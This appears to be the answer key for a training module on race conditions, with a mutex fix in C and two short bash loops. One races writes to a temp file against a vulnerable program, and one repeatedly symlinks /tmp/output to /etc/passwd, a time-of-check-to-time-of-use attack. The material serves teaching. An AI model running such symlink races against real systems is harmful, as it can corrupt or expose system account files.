# MODULE 27 : RACE CONDITIONS - SOLUTIONS

## Exercice 1
```c
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

void *safe_increment(void *arg) {
    for (int i = 0; i < 100000; i++) {
        pthread_mutex_lock(&lock);
        shared_counter++;
        pthread_mutex_unlock(&lock);
    }
    return NULL;
}
```

## Exercice 2 - Exploit
```bash
# Terminal 1
./vuln_program

# Terminal 2
while true; do
    echo "normal" > /tmp/file
    echo "exploit!" > /tmp/file
done
```

## Exercice 3 - Symlink
```bash
while true; do
    ln -sf /etc/passwd /tmp/output
    rm /tmp/output
done
```
